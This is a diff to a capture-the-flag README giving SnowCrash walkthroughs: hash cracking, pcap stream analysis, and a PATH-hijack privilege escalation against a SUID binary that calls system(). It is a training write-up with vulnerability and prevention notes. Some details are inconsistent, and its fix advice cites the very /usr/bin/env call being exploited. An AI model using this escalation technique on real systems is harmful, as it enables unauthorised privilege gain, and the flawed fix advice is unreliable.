@@ -68,7 +68,7 @@ Replace `<hostPort>` with the port number you specified in the qemu command for 
 Replace `<HostMachineIP>` with the IP address of the host machine and `<hostPort>` with the port number you specified in the qemu command for port forwarding.
 
 ### Level00:
-- use **find** to search everything related to the flag00 user in the machine where level00 has rights:
+- use **find** to search everything related to the flag00 user in the SnowCrash machine where level00 has rights:
 ```bash
     RESULT=$(find / -user flag00 2>/dev/null)
     echo $RESULT
@@ -106,3 +106,115 @@ Replace `<HostMachineIP>` with the IP address of the host machine and `<hostPort
     echo $PASSWORD
 ```
 - We get this string: `42hDRfypTqqnw` 
+- We use john the ripper to decode this string and get the password for the user flag01:
+```bash
+    # The script is in the file `level01/ressources/john_the_ripper.sh`
+    bash level01/ressources/john_the_ripper.sh
+    # the output will be:
+    Password for flag01: abcdefg
+```
+- swap to the user flag01 using the password we just found and get the flag for level02:
+```bash
+    su flag01
+    # enter the password: abcdefg
+    # then run the following command to get the flag for level02:
+    getflag
+```
+- The flag for level02 is: `the result of getflag` which is in the file `level01/flag`
+
+### Level02:
+- Swap to the user level02 and enter the password which is the flag for level01:
+```bash
+    su level02
+    # enter the password: the result of getflag
+```
+- In the home directory of the user level02 we find a file named `flag02.pcap`
+which is a packet capture file that contains network traffic data.
+like below:
+```bash
+    level02@SnowCrash:~$ ls -l
+    total 12
+    ----r--r-- 1 flag02 level02 8302 Aug 30  2015 level02.pcap
+```
+- we can analyze this file using Wireshark or tshark to find the flag for level03:
+```bash
+    # To analyze the file using tshark, run the following command:
+    tshark -r level02.pcap -z follow,tcp,ascii,0
+```
+- We get the password for the user flag02 which is: `the result of the above command`
+- swap to the user flag02 using the password we just found and get the flag for level03:
+```bash
+    su flag02
+    # enter the password: the result of the above command
+    # then run the following command to get the flag for level03:
+    getflag
+```
+- The flag for level03 is: `the result of getflag` which is in the file `level02/flag`
+### Level03:
+- Swap to the user level03 and enter the password which is the flag for level02:
+```bash    
+    su level03
+    # enter the password: the result of getflag
+```
+- In the home directory of the user level03 we find a file named `flag03` 
+```bash 
+    level03@SnowCrash:~$ ls -l
+    total 12
+    -rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
+    level03@SnowCrash:~$ ./level03 
+    Exploit me
+```
+- This file is a SUID binary that has the permissions to be executed by any user but it will run with the privileges of the user **flag03**.
+- We can decompile this binary using objdump if you can read assembly code:
+```bash
+    objdump -d level03
+```
+- Or we can use a tool like Ghidra to decompile the binary and analyze it
+```bash
+    # i use this platform to decompile the binary: 
+    https://dogbolt.org/
+```
+- We get something like this :
+```c
+    int32_t main(int argc, char** argv, char** envp)
+    {
+        gid_t eax = getegid();
+        uid_t eax_1 = geteuid();
+        setresgid(eax, eax, eax);
+        setresuid(eax_1, eax_1, eax_1);
+        return system("/usr/bin/env echo Exploit me");
+    }
+```
+#### Analysis:
+- The binary is using the `getegid()` and `geteuid()` functions to get the **effective group ID** and **effective user ID** of the process, which are the IDs (flag03) of the user that executed the binary (in this case, any user that executes the binary will have the effective IDs of the user flag03).
+- Then it uses the `setresgid()` and `setresuid()` functions to set the real, effective, and saved group ID and user ID of the process to the values obtained from `getegid()` and `geteuid()`, which means that the process will run with the privileges of the user flag03.
+- Finally, it uses the `system()` function to execute the command `echo Exploit me` with the privileges of the user flag03.
+
+#### Vulnerability:
+- The vulnerability in this binary is that it uses the combination of `setresgid()`, `setresuid()`, and `system()` functions without properly sanitizing the **environment variables** (e.g., `PATH`) or/and the command being executed.
+- This allows an attacker to manipulate the environment variables or the command being executed to execute arbitrary commands with the privileges of the user flag03, which can lead to privilege escalation and potentially compromise the entire system if the user flag03 has high privileges.
+
+
+#### Exploitation:
+- To exploit this binary, we can create a malicious script that will be executed by the `system()` function with the privileges of the user flag03. 
+- We can create a script named `echo` with the following content:
+```bash
+    #!/bin/bash
+    # This script will be executed with the privileges of the user flag03
+    # We can use it to run the getflag to get the flag for level04
+    echo "getflag" > /tmp/echo
+    chmod +x /tmp/echo
+    export PATH=/tmp:$PATH
+    ./level03
+    # Result is the flag for level04 which is in the file `level03/flag`
+```
+#### Prevention:
+- To prevent this type of vulnerability, the binary should properly sanitize the environment variables and the command being executed. 
+- For example, it should use an absolute path for the command being executed (e.g., `/usr/bin/env`) and should not allow the user to manipulate the `PATH` environment variable. 
+- Additionally, it should use a more secure method for executing commands, such as `execve()` instead of `system()`, which does not invoke a shell and therefore reduces the risk of command injection.
+
+#### conclusion:
+- By exploiting the vulnerability in the `level03` binary, we can execute arbitrary commands with the privileges of the user flag03, which allows us to get the flag for level04 and progress through the CTF challenge. 
+- This highlights the importance of properly sanitizing environment variables and commands when developing software, especially when dealing with privileged operations, to prevent potential security vulnerabilities and protect the integrity of the system.
+                
+### Level04:
